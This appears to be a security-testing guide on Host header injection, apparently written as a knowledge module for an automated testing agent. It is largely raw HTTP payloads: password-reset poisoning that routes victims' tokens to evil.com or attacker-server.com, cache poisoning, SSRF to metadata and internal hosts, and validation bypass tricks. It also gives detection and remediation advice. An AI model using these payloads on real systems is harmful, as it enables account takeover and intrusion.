<host_header_injection_guide>
<title>HOST HEADER INJECTION</title>

<critical>Host header injection occurs when applications trust the Host header for security-critical operations like generating password reset links, constructing URLs, or caching decisions. Attackers can manipulate this header to poison caches, redirect users, steal credentials, and bypass access controls. Modern applications with virtual hosting, load balancers, and CDNs are particularly susceptible.</critical>

<scope>
- Password reset link poisoning
- Cache poisoning via Host header
- Web cache deception
- SSRF through Host header manipulation
- Virtual host routing bypass
- Access control circumvention
- Open redirect via Host header
</scope>

<methodology>
1. Identify functionality that uses the Host header (password reset, link generation, redirects).
2. Test if the application accepts arbitrary Host header values.
3. Probe for secondary headers that override Host (X-Forwarded-Host, X-Host, etc.).
4. Attempt cache poisoning with manipulated Host values.
5. Test for SSRF by routing requests to internal hosts.
</methodology>

<attack_vectors>
<password_reset_poisoning>
{% raw %}
# Basic Host header manipulation
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# With legitimate host as backup
POST /forgot-password HTTP/1.1
Host: evil.com
X-Forwarded-Host: legitimate.com

# Absolute URL in request
POST https://legitimate.com/forgot-password HTTP/1.1
Host: evil.com
{% endraw %}
</password_reset_poisoning>

<header_variations>
{% raw %}
# Headers that may override Host
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
X-Original-Host: evil.com
X-Rewrite-URL: evil.com
X-Original-URL: evil.com

# Multiple Host headers
Host: evil.com
Host: legitimate.com

# Host with port manipulation
Host: legitimate.com:evil.com
Host: legitimate.com@evil.com
Host: evil.com#legitimate.com
Host: evil.com?legitimate.com
{% endraw %}
</header_variations>

<cache_poisoning>
{% raw %}
# Poison cache with malicious Host
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

# Cache key manipulation
GET /?cb=random HTTP/1.1
Host: evil.com

# Vary header exploitation
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: evil.com
X-Cache-Key: legitimate.com
{% endraw %}
</cache_poisoning>

<ssrf_via_host>
{% raw %}
# Internal host access
Host: localhost
Host: 127.0.0.1
Host: internal-service.local
Host: 169.254.169.254

# Port manipulation
Host: localhost:8080
Host: internal:3000

# With original host preserved
X-Forwarded-Host: localhost
X-Original-Host: internal-admin
{% endraw %}
</ssrf_via_host>
</attack_vectors>

<bypass_techniques>
<validation_bypass>
{% raw %}
# Subdomain injection
Host: evil.legitimate.com
Host: legitimate.com.evil.com

# Port-based bypass
Host: legitimate.com:80@evil.com
Host: legitimate.com:443@evil.com

# Special character bypass
Host: legitimate.com%00.evil.com
Host: legitimate.com%0d%0a.evil.com
Host: legitimate.com\.evil.com

# Unicode normalization
Host: legıtimate.com  # Turkish dotless i
Host: legitⅰmate.com  # Roman numeral

# Case manipulation
Host: LEGITIMATE.com
Host: Legitimate.Com
{% endraw %}
</validation_bypass>

<double_host_headers>
{% raw %}
# First Host wins vs Last Host wins
Host: evil.com
Host: legitimate.com

# With space injection
Host: legitimate.com
 Host: evil.com

# Tab separated
Host:	evil.com
Host: legitimate.com
{% endraw %}
</double_host_headers>

<absolute_url_attack>
{% raw %}
# Request line with absolute URL
GET https://legitimate.com/path HTTP/1.1
Host: evil.com

# HTTP/1.0 behavior differences
GET http://evil.com/path HTTP/1.0
Host: legitimate.com
{% endraw %}
</absolute_url_attack>
</bypass_techniques>

<exploitation_scenarios>
<password_reset_theft>
{% raw %}
# Attack flow:
1. Attacker identifies password reset functionality
2. Submits victim's email with manipulated Host header:
   POST /forgot-password HTTP/1.1
   Host: attacker-server.com
   
   email=victim@example.com
   
3. Victim receives email with: 
   https://attacker-server.com/reset?token=secret_token
   
4. If victim clicks, attacker captures reset token
5. Attacker uses token on legitimate site to reset password
{% endraw %}
</password_reset_theft>

<cache_poisoning_attack>
{% raw %}
# Step 1: Identify cacheable response
GET /static/main.js HTTP/1.1
Host: legitimate.com
# Response includes: X-Cache: HIT

# Step 2: Poison with malicious Host
GET /static/main.js HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
# If response uses Host for absolute URLs, inject malicious content

# Step 3: Verify poisoning
GET /static/main.js HTTP/1.1
Host: legitimate.com
# Check if cached response contains evil.com references
{% endraw %}
</cache_poisoning_attack>

<virtual_host_bypass>
{% raw %}
# Access restricted virtual host
Host: admin.internal.local
Host: staging.example.com
Host: dev.example.com

# Backend routing manipulation
X-Forwarded-Host: admin-panel
X-Original-Host: restricted-vhost

# IP-based virtual hosts
Host: 10.0.0.1
Host: 192.168.1.100
{% endraw %}
</virtual_host_bypass>

<web_cache_deception>
{% raw %}
# Combine Host injection with cache deception
GET /account/settings.css HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com

# Force static file extension caching
GET /api/user/profile.js HTTP/1.1
Host: legitimate.com
{% endraw %}
</web_cache_deception>
</exploitation_scenarios>

<detection>
<indicators>
{% raw %}
# Look for Host reflection in:
- Password reset emails
- Email confirmation links
- Generated URLs in responses
- Redirect locations
- Canonical URLs
- OpenGraph/meta tags
- JavaScript configuration
- API base URL configurations
{% endraw %}
</indicators>

<testing_methodology>
{% raw %}
# Step 1: Baseline request
GET / HTTP/1.1
Host: legitimate.com
# Note response content

# Step 2: Modified Host
GET / HTTP/1.1
Host: test-injection.com
# Compare response for Host reflection

# Step 3: Secondary headers
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: test-injection.com
# Check which header takes precedence

# Step 4: Cache probing
GET /?cachebust=random HTTP/1.1
Host: test-injection.com
# Check if cached responses affected
{% endraw %}
</testing_methodology>
</detection>

<validation>
1. Demonstrate Host header value reflected in password reset links or URLs.
2. Show cache poisoning with malicious Host affecting subsequent requests.
3. Prove SSRF or internal host access via Host manipulation.
4. Document which header variation (Host, X-Forwarded-Host, etc.) is vulnerable.
5. Provide evidence of impact (stolen tokens, cached malicious content, access bypass).
</validation>

<false_positives>
- Host header validated against allowlist
- Absolute URLs hardcoded, not generated from Host
- CDN/reverse proxy normalizing Host header
- Application ignoring Host for URL generation
- X-Forwarded-Host only accepted from trusted proxies
</false_positives>

<impact>
- Account takeover via password reset poisoning
- Cache poisoning affecting all users
- Credential theft through link manipulation
- SSRF accessing internal services
- Virtual host access control bypass
- Open redirect to phishing sites
- Web cache deception information disclosure
</impact>

<pro_tips>
1. Password reset is the highest-impact target for Host injection.
2. Test X-Forwarded-Host first - often less validated than Host.
3. Check cache headers (X-Cache, Age) to identify cacheable responses.
4. Email preview tools help identify poisoned reset links.
5. Multiple Host headers exploit parser differentials.
6. Absolute URL in request line can override Host header.
7. Port injection (Host: site.com:evil.com) bypasses some validations.
8. Test staging/dev environments - often more permissive.
9. API endpoints may have separate Host validation logic.
10. Mobile apps often don't validate Host in server responses.
</pro_tips>

<remember>Host header injection weaponizes trust in HTTP headers. Applications must validate Host values against an explicit allowlist and never use them directly for security-critical operations. Password reset poisoning is the canonical high-impact exploit, but cache poisoning can affect entire user populations.</remember>
</host_header_injection_guide>
